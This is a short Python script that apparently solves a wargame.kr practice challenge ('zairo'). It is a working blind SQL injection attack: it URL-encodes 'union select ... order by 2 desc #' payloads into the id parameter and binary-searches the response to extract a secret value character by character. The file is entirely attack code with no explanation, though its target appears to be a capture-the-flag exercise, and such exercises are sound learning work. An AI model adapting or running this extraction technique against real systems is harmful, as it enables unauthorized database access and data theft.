from requests import *
from urllib.parse import *
tmp='0123456789abcdefghijklmnopqrstuvwxyz'
start=0
end=len(tmp)-1
pivot=int((start+end)/2)
result=''
middle=''
for i in range(16):
    if start!=0 or end!=len(tmp)-1:
        print('count error')
        break
    for j in range(10):
        url='http://wargame.kr:8080/zairo?pw=&flag=abs&id='
        middle=result
        middle+=tmp[pivot]
        payload=quote(f"zairowkdlfhdkel' union select 1,'{middle}',3,4,5 order by 2 desc #")
        url+=payload
        print(url)
        response=get(url=url)
        print(start)
        print(pivot)
        print(end)
        print(response.text)
        '''
        if response.text.find('zairowkdlfhdkel') == -1 and response.text.find('2') == -1:
            print('non error')
            break
        '''
        if response.text.find('NOW COUNT = 148') != -1:
            break
        if response.text.find('zairowkdlfhdkel') != -1:
            start=pivot+1
            pivot=int((start+end)/2)
        else:
            end=pivot-1
            pivot=int((start+end)/2)
        if start > end:
                result+=tmp[pivot]
                start=0
                end=len(tmp)-1
                pivot=int((start+end)/2)
                break
print(result.lower())